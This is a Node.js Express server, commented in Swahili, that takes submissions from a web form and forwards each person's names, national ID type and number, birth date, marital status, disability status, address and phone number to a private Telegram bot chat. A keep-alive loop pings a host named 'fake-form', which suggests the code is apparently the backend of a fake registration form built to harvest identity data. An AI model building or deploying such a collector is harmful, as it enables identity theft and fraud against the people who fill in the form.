import express from "express";
import fetch from "node-fetch";
import cors from "cors";
import dotenv from "dotenv";

dotenv.config();
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Endpoint ya kupokea form data
app.post("/submit", async (req, res) => {
  const data = req.body;

  const telegramMessage = `
Mpya Form Imewasilishwa:

Majina: ${data.names}
Aina ya Kitambulisho: ${data.id_type}
Namba ya Kitambulisho: ${data.id_number}
Tarehe ya Kuzaliwa: ${data.birth_day}/${data.birth_month}/${data.birth_year}
Hali ya Ndoa: ${data.marital_status}
Namba ya Dharura: ${data.emergency_contact}

Kozi: ${data.course}
Uzoefu: ${data.workplace}
Ulemavu: ${data.disability || 'hapana'}
${data.disability === 'ndio' ? `Aina ya Ulemavu: ${data.disability_type}` : ''}
Anuani: ${data.address}
Simu: ${data.phone}
Muda wa kazi: ${data.years_job}
`;

  try {
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: telegramMessage,
      }),
    });
    res.status(200).json({ message: "Form imetumwa kikamilifu." });
  } catch (error) {
    console.error("Telegram error:", error);
    res.status(500).json({ message: "Imeshindikana kutuma Telegram." });
  }
});

// Homepage (kuweza ku-ping server)
app.get("/", (req, res) => {
  res.send("Server is running...");
});

// Keep Alive Ping - kila dakika 5
setInterval(() => {
  fetch("https://fake-form-qc0f.onrender.com/")
    .then(() => console.log("Keep alive ping successful"))
    .catch(err => console.error("Keep alive error:", err));
}, 5 * 60 * 1000); // 5 minutes

// Kuwasha server
app.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});
